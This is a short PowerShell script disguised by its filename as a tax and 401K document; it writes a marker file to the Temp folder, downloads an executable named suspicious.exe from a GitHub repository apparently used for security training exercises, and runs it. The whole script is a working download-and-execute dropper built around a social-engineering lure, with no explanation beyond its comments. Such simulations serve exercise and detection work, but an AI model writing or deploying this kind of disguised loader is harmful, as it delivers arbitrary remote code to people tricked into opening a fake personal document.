<#
.SYNOPSIS
    My-Tax-Documents-401K-info.ps1
.DESCRIPTION
    1) Logs execution to marker.txt in Temp  
    2) Downloads the real loader EXE into Temp  
    3) Executes the downloaded loader  
#>

# 1) Write a marker so investigators see the script ran
$marker = Join-Path $env:TEMP 'marker.txt'
"[+] My-Tax-Documents-401K-info.ps1 executed at $(Get-Date -Format o)" |
    Out-File -FilePath $marker -Append

# 2) Download the real loader EXE into Temp (raw URL)
$loaderUrl  = 'https://raw.githubusercontent.com/ttx-playground/TTX/main/suspicious.exe'
$loaderPath = Join-Path $env:TEMP 'suspicious.exe'
Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath -UseBasicParsing

# 3) Execute the downloaded loader under the user context
Start-Process -FilePath $loaderPath -NoNewWindow -Wait
